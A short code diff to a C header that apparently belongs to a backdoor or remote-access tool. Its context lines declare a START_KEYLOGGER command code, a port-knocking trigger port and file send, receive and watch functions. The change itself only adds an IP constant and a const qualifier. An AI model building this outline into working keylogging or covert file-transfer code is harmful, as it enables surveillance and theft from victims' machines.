@@ -11,6 +11,7 @@ struct server_options;
 #define COMMAND_TRIGGER_THRESHOLD 2
 #define RECEIVING_PORT 8080
 #define PORT_KNOCKING_PORT 30
+#define INITIAL_IP 10
 
 enum command_codes {
     START_KEYLOGGER = 0x01,
@@ -76,7 +77,7 @@ enum FILE_TYPE {
 };
 
 void send_file(struct server_options * server_options);
-void receive_file(struct server_options * server_options);
+void receive_file(const struct server_options * server_options);
 void send_watch(int fd, enum FILE_TYPE file_type, char * path);
 
 
